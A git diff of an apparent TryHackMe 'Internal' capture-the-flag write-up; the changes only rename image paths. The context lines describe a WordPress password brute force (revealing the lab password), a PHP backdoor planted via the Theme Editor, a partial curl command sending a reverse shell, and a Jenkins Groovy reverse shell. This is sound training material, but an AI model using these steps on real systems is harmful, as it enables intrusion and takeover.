@@ -28,7 +28,7 @@ Additionally, the client has provided the following scope allowances:
 
 I'll start with a rustscan to see what ports are open. You can find rustscan [here](https://github.com/RustScan/RustScan).
 
-<img src="/images/internal/rustscan.gif" class="center-image" />
+<img src="/images/Internal/rustscan.gif" class="center-image" />
 
 I'm also going to add the ip address to my /etc/hosts file:
 ```
@@ -48,7 +48,7 @@ PORT   STATE SERVICE REASON
 
 Navigating to `http://internal.thm` returns a default apache page.
 
-<img src="/images/internal/apache.png" class="center-image" />
+<img src="/images/Internal/apache.png" class="center-image" />
 
 Now I'll run gobuster to see if I can find any interesting directories on the webserver:
 ```
@@ -75,13 +75,13 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
  It look like there's a Wordpress blog running on the box. Navigating to /blog returns the front page for the blog:
 
-<img src="/images/internal/blog.png" class="center-image" />
+<img src="/images/Internal/blog.png" class="center-image" />
 
 
 
 And I can get to the default wordpress login at `http://internal.thm/blog/wp-login.php`:
 
-<img src="/images/internal/login.png" class="center-image" />
+<img src="/images/Internal/login.png" class="center-image" />
 
 My go-to tool for enumerating Wordpress sites is [wpscan](https://wpscan.org/). I'll run wpscan to see if I can find any users on the site and brute force their password.
 ```
@@ -111,7 +111,7 @@ Trying admin / my2boys Time: 00:06:03 <=========================================
 
 The scan returns the admin user and their password! I'll use these creds to login to the admin panel. From here, I can use the "Theme Editor" to create a php backdoor by replacing the code for the `404.php` page.
 
-<img src="/images/internal/ThemeEdit.png" class="center-image" />
+<img src="/images/Internal/ThemeEdit.png" class="center-image" />
 
 I'll use the following code for the backdoor:
 ```
@@ -120,7 +120,7 @@ I'll use the following code for the backdoor:
 
 I'll visit `http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php?pwned=id` to confirm that I have code execution.
 
-<img src="/images/internal/Backdoor.png" class="center-image" />
+<img src="/images/Internal/Backdoor.png" class="center-image" />
 
 I can now use the following curl command to get a reverse shell on the box with netcat:
 ```
@@ -130,7 +130,7 @@ curl "http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php" --data
 
 And I can catch the shell with netcat on my kali box.
 
-<img src="/images/internal/Internal_shell.gif" class="center-image" />
+<img src="/images/Internal/Internal_shell.gif" class="center-image" />
 
 
 
@@ -186,31 +186,31 @@ Once again, I'll have to brute force for the admin password. I guessed the usern
 
 Intercepting the request:
 
- <img src="/images/internal/intercept.png" class="center-image" />
+ <img src="/images/Internal/intercept.png" class="center-image" />
 
 
 Marking the password field:
 
- <img src="/images/internal/intruder1.png" class="center-image" />
+ <img src="/images/Internal/intruder1.png" class="center-image" />
 
 
 Loading the wordlist and beginning the attack:
 
- <img src="/images/internal/intruder2.png" class="center-image" />
+ <img src="/images/Internal/intruder2.png" class="center-image" />
 
 
 I can sort by HTTP response length to find the successful login request and corresponding password:   
 
-<img src="/images/internal/intruder3.png" class="center-image" />
+<img src="/images/Internal/intruder3.png" class="center-image" />
 
 
 I'm not too familiar with Jenkins, but I did some googling and found that there is a script console that allows admins to execute commands on the server. 
 
-<img src="/images/internal/JenkinsMenu.png" class="center-image" />
+<img src="/images/Internal/JenkinsMenu.png" class="center-image" />
 
 All scripts must be written in Groovy script.
 
-<img src="/images/internal/JenkinsScriptConsole.png" class="center-image" />
+<img src="/images/Internal/JenkinsScriptConsole.png" class="center-image" />
 
 I was able to find this [Groovy script reverse shell](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) on Github and get a reverse shell on my Kali box. I'll modify the host, port, and cmd variables to match my target:
 ```groovy
